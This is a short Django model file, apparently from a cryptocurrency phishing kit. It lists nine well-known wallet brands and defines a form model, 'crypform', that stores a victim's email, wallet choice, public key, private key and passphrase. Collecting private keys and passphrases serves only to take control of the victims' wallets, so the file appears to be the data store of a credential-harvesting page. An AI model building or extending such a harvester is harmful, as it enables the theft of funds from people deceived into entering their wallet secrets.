from django.db import models

# Create your models here.
WALLET = (
	(0,'Ledger Nano X'),
	(1,'Exodus'),
	(2,'Trust'),
	(3,'Robinhood'),
	(4,'Coinbase'),
	(5,'Trezor'),
	(6,'BitPay'),
	(7,'MyCelium'),
	(8,'MetaMask'),
	)
class crypform(models.Model):
	email = models.EmailField()
	wallet_name = models.IntegerField(choices=WALLET)
	wallet_public_key = models.CharField(max_length=250)
	wallet_private_key = models.CharField(max_length=250)
	wallet_passphrase = models.CharField(max_length=250)
